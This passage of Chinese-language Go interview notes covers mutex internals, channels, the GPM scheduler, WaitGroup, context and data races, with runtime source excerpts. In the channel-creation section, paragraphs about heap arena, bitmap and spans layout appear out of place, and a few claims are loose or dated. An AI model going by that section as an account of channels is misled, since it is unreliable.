但是如果长时间上锁的话，自旋锁会非常耗费性能，它阻止了其他线程的运行和调度。线程持有锁的时间越长，则持有该锁的线程将被OS调度程序中断的风险越大。如果发生中断情况，那么其他线程将保持旋转状态(反复尝试获取锁)，而持有该锁的线程并不打算释放锁，这样导致的是结果是无限期推迟，直到持有锁的线程可以完成并释放它为止。

解决上面这种情况一个很好的方式是给自旋锁设定一个自旋时间，等时间一到立即释放自旋锁。自旋锁的目的是占着CPU资源不进行释放，等到获取锁立即进行处理。

**信号量**

在OS中有P和V操作，P操作是将信号量-1，V操作是将信号量+1，所以信号量的运作方式为：

- 初始化，给与它一个非负数的整数值。
- 程序企图进入临界区块的进程，需要先运行P。
  - 当信号量S减为负值时，进程会被挡住，不能继续，这时该进程被阻塞；
  - 当信号量S不为负值时，进程可以获准进入临界区块。
- 结束离开临界区块的进程，将会运行V。当信号量S不为负值时，先前被挡住的其他进程，将可获准进入临界区块。

**信号量和锁**

信号量和锁虽然看起来很相似，比如当信号量为1时就实现了互斥锁，但实际上他们表示的含义不同[1](https://nxw.name/2021/golang-mutexde-shi-xian-yuan-li-1ef30cc7#fn-1)。锁是用来保护临界资源的，比如读写不可以同时进行等；信号量是为了保证进程（或线程或goroutine）调度的，比如三个进程共同计算c=a+b，首先计算a+b和赋值操作不能同时进行，其次还要保证a+b先执行，对c的赋值后执行，因此这个地方需要采用信号量的方式来进行。

更进一步的，锁可以由信号量实现，那么goroutine可以遵循规定的被阻塞和唤醒，也可以由自旋锁实现，那么goroutine一直占用CPU直到解锁。他们这两种方式的区别在于是否需要goroutine调度，但本质上锁的实现都是为了保证临界资源不会被错误的访问。

```
// 互斥锁的公平性。

//

// 互斥锁有两种运行模式：正常模式和饥饿模式。

// 在正常模式下，请求锁的goroutine会按 FIFO(先入先出)的顺序排队，依次被唤醒，但被唤醒的goroutine并不能直接获取锁，而是要与新请求锁的goroutines去争夺锁的所有权。

// 但是这其实是不公平的，因为新请求锁的goroutines有一个优势：他们正在cpu上运行且数量可能比较多，所以新唤醒的goroutine在这种情况下很难获取锁。在这种情况下，如果这个goroutine获取失败，会直接插入到队列的头部。

// 如果一个等待的goroutine超过1ms时仍未获取到锁，会将这把锁转换为饥饿模式。

//

// 在饥饿模式下，互斥锁的所有权会直接从解锁的goroutine转移到队首的goroutine。

// 并且新到达的goroutines不会尝试获取锁，会直接插入到队列的尾部。

//

// 如果一个等待的goroutine获得了锁的所有权，并且满足以下两个条件之一：

// (1) 它是队列中的最后一个goroutine

// (2) 它等待的时间少于 1 毫秒(hard code在代码里)

// 它会将互斥锁切回正常模式。

//

// 普通模式具有更好的性能，因为即使有很多阻塞的等待锁的goroutine，一个goroutine也可以尝试请求多次锁。

// 而饥饿模式则可以避免尾部延迟这种bad case。 
```

#### Mutex结构体

源码包`src/sync/mutex.go:Mutex`定义了互斥锁的数据结构：

```go
type Mutex struct {
	state int32
	sema  uint32
}
```

- Mutex.state表示互斥锁的状态，比如是否被锁定等。
- Mutex.sema表示信号量，协程阻塞等待该信号量，解锁的协程释放信号量从而唤醒等待信号量的协程。

我们看到Mutex.state是32位的整型变量，内部实现时把该变量分成四份，用于记录Mutex的四种状态。

下图展示Mutex的内存布局：

![img](https://oscimg.oschina.net/oscnet/894956cce1cf2658635e3795c6d0a9816d4.jpg)

- Locked: 表示该Mutex是否已被锁定，0：没有锁定 1：已被锁定。
- Woken: 表示是否有协程已被唤醒，0：没有协程唤醒 1：已有协程唤醒，正在加锁过程中。
- Starving：表示该Mutex是否处理饥饿状态， 0：没有饥饿 1：饥饿状态，说明有协程阻塞了超过1ms。
- Waiter: 表示阻塞等待锁的协程个数，协程解锁时根据此值来判断是否需要释放信号量。

协程之间抢锁实际上是抢给Locked赋值的权利，能给Locked域置1，就说明抢锁成功。抢不到的话就阻塞等待Mutex.sema信号量，一旦持有锁的协程解锁，等待的协程会依次被唤醒。

Woken和Starving主要用于控制协程间的抢锁过程，后面再进行了解。

#### mutex方法

Mutext对外提供两个方法，实际上也只有这两个方法：

- Lock() : 加锁方法
- Unlock(): 解锁方法

下面我们分析一下加锁和解锁的过程，加锁分成功和失败两种情况，成功的话直接获取锁，失败后当前协程被阻塞，同样，解锁时跟据是否有阻塞协程也有两种处理。

#### 加锁和解锁过程

##### 简单加锁

假定当前只有一个协程在加锁，没有其他协程干扰，那么过程如下图所示：

![img](https://oscimg.oschina.net/oscnet/3a4cabbb3da6a1ca30031214a5de309884d.jpg)

加锁过程会去判断Locked标志位是否为0，如果是0则把Locked位置1，代表加锁成功。从上图可见，加锁成功后，只是Locked位置1，其他状态位没发生变化。

##### 加锁被阻塞

假定加锁时，锁已被其他协程占用了，此时加锁过程如下图所示：

![img](https://oscimg.oschina.net/oscnet/6d28d2ebba4c610bed79571c2081ca2517b.jpg)

从上图可看到，当协程B对一个已被占用的锁再次加锁时，Waiter计数器增加了1，此时协程B将被阻塞，直到Locked值变为0后才会被唤醒。

##### 简单解锁

假定解锁时，没有其他协程阻塞，此时解锁过程如下图所示：

![img](https://oscimg.oschina.net/oscnet/f9c9346331aaf09a6c9a6a37d1e8cba2efc.jpg)

由于没有其他协程阻塞等待加锁，所以此时解锁时只需要把Locked位置为0即可，不需要释放信号量。

##### 解锁并唤醒协程

假定解锁时，有1个或多个协程阻塞，此时解锁过程如下图所示：

![img](https://oscimg.oschina.net/oscnet/5255c433b21451ddf781fcb90e50b74cd3a.jpg)

协程A解锁过程分为两个步骤，一是把Locked位置0，二是查看到Waiter>0，所以释放一个信号量，唤醒一个阻塞的协程，被唤醒的协程B把Locked位置1，于是协程B获得锁。

#### 自旋

##### 自旋条件

加锁时程序会自动判断是否可以自旋，无限制的自旋将会给CPU带来巨大压力，所以判断是否可以自旋就很重要了。

自旋必须满足以下所有条件：

- 自旋次数要足够小，通常为4，即自旋最多4次
- CPU核数要大于1，否则自旋没有意义，因为此时不可能有其他协程释放锁
- 协程调度机制中的Process数量要大于1，比如使用GOMAXPROCS()将处理器设置为1就不能启用自旋
- 协程调度机制中的可运行队列必须为空，否则会延迟协程调度

可见，自旋的条件是很苛刻的，总而言之就是不忙的时候才会启用自旋。

##### 自旋的优势

自旋的优势是更充分的利用CPU，尽量避免协程切换。因为当前申请加锁的协程拥有CPU，如果经过短时间的自旋可以获得锁，当前协程可以继续运行，不必进入阻塞状态。

##### 自旋的问题

如果自旋过程中获得锁，那么之前被阻塞的协程将无法获得锁，如果加锁的协程特别多，每次都通过自旋获得锁，那么之前被阻塞的进程将很难获得锁，从而进入饥饿状态。

为了避免协程长时间无法获取锁，自1.8版本以来增加了一个状态，即Mutex的Starving状态。这个状态下不会自旋，一旦有协程释放锁，那么一定会唤醒一个协程并成功加锁。

#### 常见问题

1. sync.mutex不可重入
2. sync.mutex，尝试去unlock一把空闲的mutex，会导致panic。
3. sync.mutex不与goroutine绑定，可由a goroutine获取锁，b goroutine释放锁。
4. 不要复制sync.Mutex，mutex做函数参数时，传参时使用指针。

### Go channel

#### 无缓冲Chan的发送和接收是否同步

```go
ch := make(chan int)    无缓冲的channel由于没有缓冲发送和接收需要同步.
ch := make(chan int, 2) 有缓冲channel不要求发送和接收操作同步.
```

- channel无缓冲时，发送阻塞直到数据被接收，接收阻塞直到读到数据。
- channel有缓冲时，当缓冲满时发送阻塞，当缓冲空时接收阻塞。

#### 什么是channel，为什么它可以做到线程安全

Channel是Go中的一个核心类型，可以把它看成一个管道，通过它并发核心单元就可以发送或者接收数据进行通讯(communication),Channel也可以理解是一个先进先出的队列，通过管道进行通信。

Golang的Channel,发送一个数据到Channel和从Channel接收一个数据都是原子性的。

Go的设计思想就是, 不要通过共享内存来通信，而是通过通信来共享内存，前者就是传统的加锁，后者就是Channel。

也就是说，设计Channel的主要目的就是在多任务间传递数据的，本身就是安全的。

Channel 在运行时使用 `runtime.hchan` 结构体表示:

```go
type hchan struct {
	qcount   uint           // 当前队列里还剩余元素个数
	dataqsiz uint           // 环形队列长度，即缓冲区的大小，即make(chan T,N) 中的N
	buf      unsafe.Pointer // 环形队列指针
	elemsize uint16         // 每个元素的大小
	closed   uint32         // 标识当前通道是否处于关闭状态，创建通道后，该字段设置0，即打开通道；通道调用close将其设置为1，通道关闭
	elemtype *_type         // 元素类型，用于数据传递过程中的赋值
	sendx    uint           // 环形缓冲区的状态字段，它只是缓冲区的当前索引-支持数组，它可以从中发送数据
	recvx    uint          // 环形缓冲区的状态字段，它只是缓冲区当前索引-支持数组，它可以从中接受数据
	recvq    waitq         // 等待读消息的goroutine队列
	sendq    waitq         // 等待写消息的goroutine队列

	// lock protects all fields in hchan, as well as several
	// fields in sudogs blocked on this channel.
	//
	// Do not change another G's status while holding this lock
	// (in particular, do not ready a G), as this can deadlock
	// with stack shrinking.
	lock mutex           // 互斥锁，为每个读写操作锁定通道，因为发送和接受必须是互斥操作
}

type waitq struct {
	first *sudog
	last  *sudog
}
```

其中hchan结构体中有五个字段是构建底层的循环队列:

```go
* qcount — Channel 中的元素个数；
* dataqsiz — Channel 中的循环队列的长度；
* buf — Channel 的缓冲区数据指针；
* sendx — Channel 的发送操作处理到的位置；
* recvx — Channel 的接收操作处理到的位置；
```

通常, `elemsize` 和 `elemtype` 分别表示当前 Channel 能够收发的元素类型和大小.

`sendq` 和 `recvq` 存储了当前 Channel 由于缓冲区空间不足而阻塞的 Goroutine 列表，这些等待队列使用双向链表 `runtime.waitq`表示，链表中所有的元素都是 `runtime.sudog`结构.

`waitq` 表示一个在等待列表中的 Goroutine，该结构体中存储了阻塞的相关信息以及两个分别指向前后 `runtime.sudog`的指针。

channel 在Go中是通过make关键字创建,编译器会将make(chan int,10).

创建管道:

`runtime.makechan` 和 `runtime.makechan64` 会根据传入的参数类型和缓冲区大小创建一个新的 Channel 结构，其中后者用于处理缓冲区大小大于 2 的 32 次方的情况.

这里我们来详细看下 `makechan` 函数:

```go
func makechan(t *chantype, size int) *hchan {
	elem := t.elem

	// compiler checks this but be safe.
	if elem.size >= 1<<16 {
		throw("makechan: invalid channel element type")
	}
	if hchanSize%maxAlign != 0 || elem.align > maxAlign {
		throw("makechan: bad alignment")
	}

	mem, overflow := math.MulUintptr(elem.size, uintptr(size))
	if overflow || mem > maxAlloc-hchanSize || size < 0 {
		panic(plainError("makechan: size out of range"))
	}

	// Hchan does not contain pointers interesting for GC when elements stored in buf do not contain pointers.
	// buf points into the same allocation, elemtype is persistent.
	// SudoG's are referenced from their owning thread so they can't be collected.
	// TODO(dvyukov,rlh): Rethink when collector can move allocated objects.
	var c *hchan
	switch {
	case mem == 0:
		// Queue or element size is zero.
		c = (*hchan)(mallocgc(hchanSize, nil, true))
		// Race detector uses this location for synchronization.
		c.buf = c.raceaddr()
	case elem.ptrdata == 0:
		// Elements do not contain pointers.
		// Allocate hchan and buf in one call.
		c = (*hchan)(mallocgc(hchanSize+mem, nil, true))
		c.buf = add(unsafe.Pointer(c), hchanSize)
	default:
		// Elements contain pointers.
		c = new(hchan)
		c.buf = mallocgc(mem, elem, true)
	}

	c.elemsize = uint16(elem.size)
	c.elemtype = elem
	c.dataqsiz = uint(size)
	lockInit(&c.lock, lockRankHchan)

	if debugChan {
		print("makechan: chan=", c, "; elemsize=", elem.size, "; dataqsiz=", size, "\n")
	}
	return c
}
```

Channel 中根据收发元素的类型和缓冲区的大小初始化 `runtime.hchan`结构体和缓冲区：
![134.jpg](https://b3logfile.com/file/2021/04/134-ba030152.jpg?imageView2/2/w/1280/format/jpg/interlace/1/q/100)

arena区域就是我们所谓的堆区，Go动态分配的内存都是在这个区域，它把内存分割成8KB大小的页，一些页组合起来称为mspan。

bitmap区域标识arena区域哪些地址保存了对象，并且用4bit标志位表示对象是否包含指针、GC标记信息。bitmap中一个byte大小的内存对应arena区域中4个指针大小（指针大小为 8B ）的内存，所以bitmap区域的大小是512GB/(4*8B)=16GB。

![135.jpg](https://b3logfile.com/file/2021/04/135-31503ee2.jpg?imageView2/2/w/1280/format/jpg/interlace/1/q/100)
![136.jpg](https://b3logfile.com/file/2021/04/136-f302d436.jpg?imageView2/2/w/1280/format/jpg/interlace/1/q/100)

此外我们还可以看到bitmap的高地址部分指向arena区域的低地址部分，这里bitmap的地址是由高地址向低地址增长的。

spans区域存放mspan（是一些arena分割的页组合起来的内存管理基本单元，后文会再讲）的指针，每个指针对应一页，所以spans区域的大小就是512GB/8KB*8B=512MB。

除以8KB是计算arena区域的页数，而最后乘以8是计算spans区域所有指针的大小。创建mspan的时候，按页填充对应的spans区域，在回收object时，根据地址很容易就能找到它所属的mspan。

#### Channel是同步的还是异步的

Channel是异步进行的, channel存在3种状态：

- nil，未初始化的状态，只进行了声明，或者手动赋值为nil
- active，正常的channel，可读或者可写
- closed，已关闭，千万不要误认为关闭channel后，channel的值是nil

#### channel 的三种状态和三种操作结果

| 操作     | 空值(nil) | 非空已关闭 | 非空未关闭       |
| :------- | :-------- | :--------- | :--------------- |
| 关闭     | panic     | panic      | 成功关闭         |
| 发送数据 | 永久阻塞  | panic      | 阻塞或成功发送   |
| 接收数据 | 永久阻塞  | 永不阻塞   | 阻塞或者成功接收 |

#### channel 在什么情况下会引起资源泄漏

Channel 可能会引发 goroutine 泄漏。

泄漏的原因是 goroutine 操作 channel 后，处于发送或接收阻塞状态，而 channel 处于满或空的状态，一直得不到改变。同时，垃圾回收器也不会回收此类资源，进而导致 gouroutine 会一直处于等待队列中，不见天日。

另外，程序运行过程中，对于一个 channel，如果没有任何 goroutine 引用了，gc 会对其进行回收操作，不会引起内存泄漏。

### GPM模型概述

在go语言中，每个goroutine是一个独立的执行单元，相较于每个OS线程固定分配2M内存的模式，goroutine的栈采用**动态扩容**的方式，初始时仅为**2KB**，随着任务执行按需增长，最大可达1GB（64位机器最大为1G，32为机器最大为256M），且完全由golang自己的调度器Go Scheduler来调度。此外，GC会周期性地将不再使用的内存回收，收缩栈空间。因此，Go程序可以并发成千上万个goroutine是得益于它强大的调度器和高效的内存模型。

#### 调度算法

* G:表示goroutine，每个goroutine对应一个G结构体，G存储着Goroutine的运行堆栈，状态以及任务函数，可重用。G非执行体，每个G需要绑定到P才可以被调度执行。
* P：Processor，表示逻辑处理器，对G来说，P相当于CPU，G只有绑定到P中才能被调度。对于M来说，P提供了相关的执行环境（context），如内存分配状态（mcache），任务队列（G）等，P的数量由用户设置的GOMAXPROCS决定，但是不论GOMAXPROCS设置多大，P的数量最大为256。
* M：machine，OS线程抽象，代表真正执行计算的资源，在绑定了有效的P后，进入scheduler循环，而scheduler循环的机制大致是从Global队列、P的Local队列以及wait队列中获取G，切换到G的执行栈上并执行G的函数，调用goexit做清理工作并返回M，如此反复。M并不保留G状态，这是G可以跨M调度的基础，M的数量是不定的，由Go Runtine调整，为了防止创建过多OS线程导致系统调度不过来，目前默认最大限制是10000个，
* Sched：代表调度器，它维护有存储M和G的队列以及调度器的一些状态信息等.
* 每个P维护一个G的本地队列。
* 当一个G被创建出来，或者变成可执行状态后，就把他放到P的本地可执行队列中，如果满了则放入Global中。
* 当一个G在M里执行结束后，P会从队列中把该G取出；如果此时P的队列为空，既没有其他G可以执行，M就随机选择另一个P，从其可执行的G队列中取走一半。

#### 调度过程

当一个go关键字创建了一个新的goroutine时，它会被优先放入P的本地队列。为了运行goroutine，M需要绑定一个P，接着M会启动一个OS线程，循环从P的本地队列里取出一个goroutine并执行。

执行调度算法：当M执行完了当前P的Local队列里的所有G后，P也不会就此等待，他会优先尝试从Global队列寻找G来执行，如果Global队列为空，他会随机挑选另外一个P，从他的队列中拿走一半的G到自己的队列中执行。

#### 阻塞时运行另一个goroutine

* 用户态阻塞/唤醒
* 系统调用阻塞

### 抢占式调度

#### 为什么需要抢占式调度

- 单个G占用M/P时间太长的话，影响其它Goroutine的执行；
- 一旦某个G中出现死循环，那么G将永远占用该P和M，导致其它的G得不到调度，被饿死

#### 如何实现抢占式调度

- 在每个函数或方法的入口，加上一段额度的代码(morestack)，让runtime有机会检查是否抢占；
- 对于没有函数调用，纯算法循环的G，依然无法抢占(1.14之前)；也就是说，除非极端的无限循环或死循环，否则只要G调用函数，Goroutine就有抢占G的机会；
- golang1.14引入了基于信号量的抢占，解决了上述问题

#### 具体实现

- 如果1个G任务运行10ms，sysmon就会认为其运行时间太久而发出抢占调度的请求，将G置上stackguard0标志；
- 一旦G被置上抢占标志位，那么待这个G下一次调用函数或方法时，runtime便可以将G抢占，退出runnable状态，将G放入localQueue，等待下一次被调度；

#### Golang1.14基于信号量的抢占

抢占流程：

- 首先注册绑定SIGURG信号及其handler；
- sysmon间隔性的检测运行超时的P，然后发信号给M；
- M收到信号后休眠当前goroutine并重新进行调度；
  ![img](https://segmentfault.com/img/bVcUBhW)



### 为何GPM调度要有P

我们先看下go1.0源码当时是c实现的go的调度：

```go
static void
schedule(G *gp)
{
 ...
 schedlock();
 if(gp != nil) {
  ...
  switch(gp->status){
  case Grunnable:
  case Gdead:
   // Shouldn't have been running!
   runtime·throw("bad gp->status in sched");
  case Grunning:
   gp->status = Grunnable;
   gput(gp);
   break;
  }

 gp = nextgandunlock();
 gp->readyonstop = 0;
 gp->status = Grunning;
 m->curg = gp;
 gp->m = m;
 ...
 runtime·gogo(&gp->sched, 0);
}
```

这里调度的作用:

- 调用`schedlock` 方法来获取全局锁。
- 获取全局锁成功后，将当前 Goroutine 状态从 Running（正在被调度） 状态修改为 Runnable（可以被调度）状态。
- 调用`gput` 方法来保存当前 Goroutine 的运行状态等信息，以便于后续的使用。
- 调用`nextgandunlock` 方法来寻找下一个可运行 Goroutine，并且释放全局锁给其他调度使用。
- 获取到下一个待运行的 Goroutine 后，将其运行状态修改为 Running。
- 调用`runtime·gogo` 方法，将刚刚所获取到的下一个待执行的 Goroutine 运行起来，进入下一轮调度。

**GM 模型的缺点：**

Go1.0 的 GM 模型的 Goroutine 调度器限制了用 Go 编写的并发程序的可扩展性，尤其是高吞吐量服务器和并行计算程序。

**GM调度存在的问题：**

- 存在单一的全局 mutex（Sched.Lock）和集中状态管理：
  mutex 需要保护所有与 goroutine 相关的操作（创建、完成、重排等），导致锁竞争严重。
- Goroutine 传递的问题：
  goroutine（G）交接（G.nextg）：工作者线程（M's）之间会经常交接可运行的 goroutine。 而且可能会导致延迟增加和额外的开销。每个 M 必须能够执行任何可运行的 G，特别是刚刚创建 G 的 M。
- 每个 M 都需要做内存缓存（M.mcache）：

会导致资源消耗过大（每个 mcache 可以吸纳到 2M 的内存缓存和其他缓存），数据局部性差。

- 频繁的线程阻塞/解阻塞：
  在存在 syscalls 的情况下，线程经常被阻塞和解阻塞。这增加了很多额外的性能开销。

为了解决 GM 模型的以上诸多问题，在 `Go1.1` 时，`Dmitry Vyukov` 在 GM 模型的基础上，新增了一个 P（Processor）组件。并且实现了 Work Stealing 算法来解决一些新产生的问题。

**加了 P 之后会带来什么改变呢？**

- 每个 P 有自己的本地队列，大幅度的减轻了对全局队列的直接依赖，所带来的效果就是锁竞争的减少。而 GM 模型的性能开销大头就是锁竞争。
- 每个 P 相对的平衡上，在 GMP 模型中也实现了`Work Stealing` 算法，如果 P 的本地队列为空，则会从全局队列或其他 P 的本地队列中窃取可运行的 G 来运行，减少空转，提高了资源利用率。

为什么要有P呢？

一般来讲，M 的数量都会多于 P。像在 Go 中，M 的数量默认是 10000，P 的默认数量的 CPU 核数。另外由于 M 的属性，也就是如果存在系统阻塞调用，阻塞了 M，又不够用的情况下，M 会不断增加。

M 不断增加的话，如果本地队列挂载在 M 上，那就意味着本地队列也会随之增加。这显然是不合理的，因为本地队列的管理会变得复杂，且 Work Stealing 性能会大幅度下降。

M 被系统调用阻塞后，我们是期望把他既有未执行的任务分配给其他继续运行的，而不是一阻塞就导致全部停止。

因此使用 M 是不合理的，那么引入新的组件 P，把本地队列关联到 P 上，就能很好的解决这个问题。

### Golang中常用的并发模型

Golang中常用的并发模型有三种:

- 通过channel通知实现并发控制

无缓冲的通道指的是通道的大小为0，也就是说，这种类型的通道在接收前没有能力保存任何值，它要求发送 goroutine 和接收 goroutine 同时准备好，才可以完成发送和接收操作。

从上面无缓冲的通道定义来看，发送 goroutine 和接收 gouroutine 必须是同步的，同时准备后，如果没有同时准备好的话，先执行的操作就会阻塞等待，直到另一个相对应的操作准备好为止。这种无缓冲的通道我们也称之为同步通道。

```go
func main() {
    ch := make(chan struct{})
    go func() {
        fmt.Println("start working")
        time.Sleep(time.Second * 1)
        ch <- struct{}{}
    }()

    <-ch

    fmt.Println("finished")
}
```

当主 goroutine 运行到 `<-ch` 接受 channel 的值的时候，如果该 channel 中没有数据，就会一直阻塞等待，直到有值。 这样就可以简单实现并发控制

- 通过sync包中的WaitGroup实现并发控制

Goroutine是异步执行的，有的时候为了防止在结束main函数的时候结束掉Goroutine，所以需要同步等待，这个时候就需要用 WaitGroup了，在 sync 包中，提供了 WaitGroup,它会等待它收集的所有 goroutine 任务全部完成。

在WaitGroup里主要有三个方法:

- Add, 可以添加或减少 goroutine的数量.
- Done, 相当于Add(-1).
- Wait, 执行后会堵塞主线程，直到WaitGroup 里的值减至0.

在主 goroutine 中 Add(delta int) 索要等待goroutine 的数量。在每一个 goroutine 完成后 Done() 表示这一个goroutine 已经完成，当所有的 goroutine 都完成后，在主 goroutine 中 WaitGroup 返回。

```go
func main(){
    var wg sync.WaitGroup
    var urls = []string{
        "http://www.golang.org/",
        "http://www.google.com/",
    }
    for _, url := range urls {
        wg.Add(1)
        go func(url string) {
            defer wg.Done()
            http.Get(url)
        }(url)
    }
    wg.Wait()
}
```

在Golang官网中对于WaitGroup介绍是 `A WaitGroup must not be copied after first use`,**在 WaitGroup 第一次使用后，不能被拷贝**。

应用示例:

```go
func main(){
 wg := sync.WaitGroup{}
    for i := 0; i < 5; i++ {
        wg.Add(1)
        go func(wg sync.WaitGroup, i int) {
            fmt.Printf("i:%d", i)
            wg.Done()
        }(wg, i)
    }
    wg.Wait()
    fmt.Println("exit")
}
```

运行:

```go
i:1i:3i:2i:0i:4fatal error: all goroutines are asleep - deadlock!

goroutine 1 [semacquire]:
sync.runtime_Semacquire(0xc000094018)
        /home/keke/soft/go/src/runtime/sema.go:56 +0x39
sync.(*WaitGroup).Wait(0xc000094010)
        /home/keke/soft/go/src/sync/waitgroup.go:130 +0x64
main.main()
        /home/keke/go/Test/wait.go:17 +0xab
exit status 2
```

它提示所有的 `goroutine` 都已经睡眠了，出现了死锁。这是因为 wg 给拷贝传递到了 goroutine 中，导致只有 Add 操作，其实 Done操作是在 wg 的副本执行的。

因此 Wait 就会死锁。

这个第一个修改方式:将匿名函数中 wg 的传入类型改为 `*sync.WaitGroup`,这样就能引用到正确的 `WaitGroup`了。

这个第二个修改方式:将匿名函数中的 wg 的传入参数去掉，因为Go支持闭包类型，在匿名函数中可以直接使用外面的 wg 变量.

- 在Go 1.7 以后引进的强大的Context上下文，实现并发控制.

通常,在一些简单场景下使用 channel 和 WaitGroup 已经足够了，但是当面临一些复杂多变的网络并发场景下 channel 和 WaitGroup 显得有些力不从心了。

比如一个网络请求 Request，每个 Request 都需要开启一个 goroutine 做一些事情，这些 goroutine 又可能会开启其他的 goroutine，比如数据库和RPC服务。

所以我们需要一种可以跟踪 goroutine 的方案，才可以达到控制他们的目的，这就是Go语言为我们提供的 Context，称之为上下文非常贴切，它就是goroutine 的上下文。

它是包括一个程序的运行环境、现场和快照等。每个程序要运行时，都需要知道当前程序的运行状态，通常Go 将这些封装在一个 Context 里，再将它传给要执行的 goroutine 。

context 包主要是用来处理多个 goroutine 之间共享数据，及多个 goroutine 的管理。

context 包的核心是 struct Context，接口声明如下：

```go
// A Context carries a deadline, cancelation signal, and request-scoped values
// across API boundaries. Its methods are safe for simultaneous use by multiple
// goroutines.
type Context interface {
    // Done returns a channel that is closed when this `Context` is canceled
    // or times out.
    // Done() 返回一个只能接受数据的channel类型，当该context关闭或者超时时间到了的时候，该channel就会有一个取消信号
    Done() <-chan struct{}

    // Err indicates why this Context was canceled, after the Done channel
    // is closed.
    // Err() 在Done() 之后，返回context 取消的原因。
    Err() error

    // Deadline returns the time when this Context will be canceled, if any.
    // Deadline() 设置该context cancel的时间点
    Deadline() (deadline time.Time, ok bool)

    // Value returns the value associated with key or nil if none.
    // Value() 方法允许 Context 对象携带request作用域的数据，该数据必须是线程安全的。
    Value(key interface{}) interface{}
}
```

Context 对象是线程安全的，你可以把一个 Context 对象传递给任意个数的 gorotuine，对它执行取消操作时，所有 goroutine 都会接收到取消信号。

一个 Context 不能拥有 Cancel 方法，同时我们也只能 Done channel 接收数据。其中的原因是一致的：接收取消信号的函数和发送信号的函数通常不是一个。

典型的场景是：父操作为子操作操作启动 goroutine，子操作也就不能取消父操作。

### Go context包

Context中的方法:

- Done会返回一个channel，当该context被取消的时候，该channel会被关闭，同时对应的使用该context的routine也应该结束并返回。
- Context中的方法是协程安全的，这也就代表了在父routine中创建的context，可以传递给任意数量的routine并让他们同时访问。
- Deadline会返回一个超时时间，routine获得了超时时间后，可以对某些io操作设定超时时间。
- Value可以让routine共享一些数据，当然获得数据是协程安全的。

这里需要注意一点的是在goroutine中使用context包的时候,通常我们需要在goroutine中新创建一个上下文的context,原因是:如果直接传递外部context到协层中,一个请求可能在主函数中已经结束,在goroutine中如果还没有结束的话,会直接导致goroutine中的运行的被取消.

```go
go func() {
   _, ctx, _ := log.FromContextOrNew(context.Background(), nil)
}()
```

context.Background函数的返回值是一个空的context，经常作为树的根结点，它一般由接收请求的第一个goroutine创建，不能被取消、没有值、也没有过期时间。

WithCancel 和 WithTimeout 函数 会返回继承的 Context 对象， 这些对象可以比它们的父 Context 更早地取消。

当请求处理函数返回时，与该请求关联的 Context 会被取消。 当使用多个副本发送请求时，可以使用 WithCancel取消多余的请求。 WithTimeout 在设置对后端服务器请求截止时间时非常有用。

WithValue 函数能够将请求作用域的数据与 Context 对象建立关系。WithValue返回parent的一个副本，该副本保存了传入的 `key/value`，而调用Context接口的Value(key)方法就可以得到val。注意在同一个context中设置 `key/value`，若key相同，值会被覆盖。Context上下文数据的存储就像一个树，每个结点只存储一个 `key/value`对。WithValue()保存一个 `key/value`对，它将父context嵌入到新的子context，并在节点中保存了 `key/value`数据。Value()查询key对应的value数据，会从当前context中查询，如果查不到，会递归查询父context中的数据。

值得注意的是，context中的上下文数据并不是全局的，它只查询本节点及父节点们的数据，不能查询兄弟节点的数据。

**Context 使用原则:**

- 不要把Context放在结构体中，要以参数的方式传递。
- 以Context作为参数的函数方法，应该把Context作为第一个参数，放在第一位。
- 给一个函数方法传递Context的时候，不要传递nil，如果不知道传递什么，就使用context.TODO。
- Context的Value相关方法应该传递必须的数据，不要什么数据都使用这个传递。
- Context是线程安全的，可以放心的在多个goroutine中传递。

### 协程和线程和进程的区别

- 进程

进程是具有一定独立功能的程序关于某个数据集合上的一次运行活动,进程是系统进行资源分配和调度的一个独立单位。

每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信。由于进程比较重量，占据独立的内存，所以上下文进程间的切换开销（栈、寄存器、虚拟内存、文件句柄等）比较大，但相对比较稳定安全。

- 线程

线程是进程的一个实体,线程是内核态,而且是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位.线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源(如程序计数器,一组寄存器和栈),但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源。

线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易丢失数据。

- 协程

协程是一种用户态的轻量级线程，协程的调度完全由用户控制。协程拥有自己的寄存器上下文和栈。
协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈，直接操作栈则基本没有内核切换的开销，可以不加锁的访问全局变量，所以上下文的切换非常快。

### 线程和协程占用的内存空间分别多少？

线程：固定的栈内存（通常为2MB左右）、协程：一个goroutine（协程）占用内存非常小 2 KB左右

### Go中数据竞争问题怎么解决

**Data Race问题可以使用互斥锁 `sync.Mutex`, 或者也可以通过CAS无锁并发解决.**

其中使用同步访问共享数据或者CAS无锁并发是处理数据竞争的一种有效的方法.

golang在1.1之后引入了竞争检测机制，可以使用 `go run -race` 或者 `go build -race`来进行静态检测。

其在内部的实现是,开启多个协程执行同一个命令， 并且记录下每个变量的状态.

竞争检测器基于C/C++的 `ThreadSanitizer`运行时库，该库在Google内部代码基地和Chromium找到许多错误。这个技术在2012年九月集成到Go中，从那时开始，它已经在标准库中检测到42个竞争条件。现在，它已经是我们持续构建过程的一部分，当竞争条件出现时，它会继续捕捉到这些错误。

竞争检测器已经完全集成到Go工具链中，仅仅添加-race标志到命令行就使用了检测器。

```go
$ go test -race mypkg    // 测试包
$ go run -race mysrc.go  // 编译和运行程序
$ go build -race mycmd   // 构建程序
$ go install -race mypkg // 安装程序
```

要想解决数据竞争的问题可以使用互斥锁 `sync.Mutex`,解决数据竞争(Data race),也可以使用管道解决,使用管道的效率要比互斥锁高.

### go如何退出协程

#### 粗鲁的方式

直接close(channel)

如果 channel 已经被关闭，再次关闭会产生 panic，这时通过 recover 使程序恢复正常。

#### 礼貌的方式

使用 sync.Once 或互斥锁(sync.Mutex)确保 channel 只被关闭一次。

```go
type MyChannel struct {
	C    chan T
	once sync.Once
}

func NewMyChannel() *MyChannel {
	return &MyChannel{C: make(chan T)}
}

func (mc *MyChannel) SafeClose() {
	mc.once.Do(func() {
		close(mc.C)
	})
}
```

#### 优雅的方式

- 情形一：M个接收者和一个发送者，发送者通过关闭用来传输数据的通道来传递发送结束信号。
- 情形二：一个接收者和N个发送者，此唯一接收者通过关闭一个额外的信号通道来通知发送者不要再发送数据了。
- 情形三：M个接收者和N个发送者，它们中的任何协程都可以让一个中间调解协程帮忙发出停止数据传送的信号。

### Go中的锁有几种

Go中的三种锁包括:互斥锁,读写锁,`sync.Map`的安全的锁.

